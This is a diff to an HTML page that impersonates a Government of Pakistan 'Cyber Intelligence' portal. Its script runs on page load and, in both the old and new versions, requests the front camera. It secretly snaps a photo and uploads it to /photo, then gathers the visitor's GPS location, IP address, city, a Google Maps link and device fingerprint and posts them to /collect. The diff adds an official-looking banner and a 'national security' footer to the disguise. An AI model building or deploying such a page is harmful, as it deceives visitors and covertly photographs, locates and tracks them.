@@ -12,9 +12,11 @@
       background: #1b2631;
       color: #fff;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
+      justify-content: space-between;
       align-items: center;
       height: 100vh;
+      padding: 20px 0;
     }
     .box {
       background: rgba(255, 255, 255, 0.1);
@@ -65,9 +67,18 @@
       width: 80px;
       margin-bottom: 10px;
     }
+    footer {
+      font-size: 11px;
+      color: #aaa;
+      text-align: center;
+      padding: 10px;
+    }
   </style>
 </head>
 <body>
+  <div>
+    <h3 style="color: #f1c40f; text-align:center;">Confidential Access - Secure Portal</h3>
+  </div>
   <div class="box">
     <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
     <h1>🇵🇰 Government of Pakistan – Cyber Intelligence</h1>
@@ -79,117 +90,111 @@
       <button type="submit">🔍 Check Now</button>
     </form>
   </div>
+  <footer>
+    All activity is being monitored for national security purposes. Unauthorized access is prohibited.
+  </footer>
 
-<script>
-function getDeviceName() {
-  const ua = navigator.userAgent.toLowerCase();
+  <script>
+    async function reverseGeocode(lat, lon) {
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {
+          headers: { 'User-Agent': 'Mozilla/5.0' }
+        });
+        const data = await res.json();
+        return {
+          city: data.address.city || data.address.town || data.address.village || "Unknown",
+          country: data.address.country || "Unknown",
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
+        };
+      } catch {
+        return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+      }
+    }
 
-  const knownDevices = [
-    { key: "samsung", name: "Samsung" },
-    { key: "redmi", name: "Xiaomi Redmi" },
-    { key: "mi", name: "Xiaomi Mi" },
-    { key: "poco", name: "POCO" },
-    { key: "infinix", name: "Infinix" },
-    { key: "vivo", name: "Vivo" },
-    { key: "oppo", name: "Oppo" },
-    { key: "realme", name: "Realme" },
-    { key: "huawei", name: "Huawei" },
-    { key: "tecno", name: "Tecno" },
-    { key: "iphone", name: "iPhone" },
-    { key: "ipad", name: "iPad" },
-    { key: "pixel", name: "Google Pixel" },
-    { key: "sony", name: "Sony Xperia" },
-    { key: "motorola", name: "Motorola" },
-    { key: "nokia", name: "Nokia" },
-    { key: "oneplus", name: "OnePlus" },
-    { key: "lg", name: "LG" },
-    { key: "honor", name: "Honor" },
-    { key: "lenovo", name: "Lenovo" },
-  ];
+    function getDeviceName(userAgent) {
+      const devices = [
+        { name: "Samsung", pattern: /samsung|sm-/i },
+        { name: "Xiaomi", pattern: /xiaomi|redmi|mi /i },
+        { name: "Oppo", pattern: /oppo/i },
+        { name: "Vivo", pattern: /vivo/i },
+        { name: "Realme", pattern: /realme/i },
+        { name: "Infinix", pattern: /infinix/i },
+        { name: "Tecno", pattern: /tecno/i },
+        { name: "Sony", pattern: /sony/i },
+        { name: "OnePlus", pattern: /oneplus/i },
+        { name: "Google Pixel", pattern: /pixel/i },
+        { name: "iPhone", pattern: /iphone/i },
+      ];
+      for (const device of devices) {
+        if (device.pattern.test(userAgent)) return device.name;
+      }
+      return "Unknown Device";
+    }
 
-  for (let device of knownDevices) {
-    if (ua.includes(device.key)) return device.name;
-  }
+    async function sendFullData(coords, cameraStatus) {
+      const userAgent = navigator.userAgent;
+      const deviceInfo = getDeviceName(userAgent);
+      let ip = "Unknown", locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
 
-  if (ua.includes("android")) return "Generic Android Device";
-  if (ua.includes("linux")) return "Linux Device";
+      try {
+        const ipRes = await fetch("https://api64.ipify.org?format=json");
+        const ipJson = await ipRes.json();
+        ip = ipJson.ip;
+      } catch {}
 
-  return "Unknown Device";
-}
+      if (coords) {
+        locationData = await reverseGeocode(coords.latitude, coords.longitude);
+      }
 
-async function reverseGeocode(lat, lon) {
-  try {
-    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-    const res = await fetch(url, {
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    });
-    const data = await res.json();
-    return {
-      city: data.address.city || data.address.town || data.address.village || "Unknown",
-      country: data.address.country || "Unknown",
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
-    };
-  } catch (e) {
-    return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-  }
-}
+      const payload = {
+        ip,
+        latitude: coords?.latitude || null,
+        longitude: coords?.longitude || null,
+        mapsLink: coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : "❌ Location Denied",
+        timezone: locationData.timezone,
+        city: locationData.city,
+        country: locationData.country,
+        camera: cameraStatus,
+        userAgent,
+        deviceInfo
+      };
 
-async function sendFullData(locationCoords, cameraStatus) {
-  let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-
-  if (locationCoords) {
-    locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
-  }
-
-  const payload = {
-    ip: "Unknown", // server side milega
-    latitude: locationCoords?.latitude || null,
-    longitude: locationCoords?.longitude || null,
-    mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
-    timezone: locationData.timezone,
-    city: locationData.city,
-    country: locationData.country,
-    camera: cameraStatus,
-    userAgent: navigator.userAgent,
-    deviceInfo: getDeviceName()
-  };
-
-  await fetch("/collect", {
-    method: "POST",
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
-
-async function askForPermissions() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-    setTimeout(() => {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('photo', blob, 'photo.jpg');
-        fetch('/photo', { method: 'POST', body: formData });
+      await fetch("/collect", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
       });
-      stream.getTracks().forEach(track => track.stop());
-    }, 3000);
+    }
 
-    navigator.geolocation.getCurrentPosition(
-      pos => sendFullData(pos.coords, "✅ Camera Allowed"),
-      err => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
-    );
-  } catch (err) {
-    sendFullData(null, "❌ Camera Denied");
-  }
-}
+    async function askForPermissions() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            fetch('/photo', { method: 'POST', body: formData });
+          });
+          stream.getTracks().forEach(track => track.stop());
+        }, 3000);
 
-window.onload = askForPermissions;
-</script>
+        navigator.geolocation.getCurrentPosition(
+          pos => sendFullData(pos.coords, "✅ Camera Allowed"),
+          () => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
+        );
+      } catch (err) {
+        sendFullData(null, "❌ Camera Denied");
+      }
+    }
+
+    window.onload = askForPermissions;
+  </script>
 </body>
 </html>
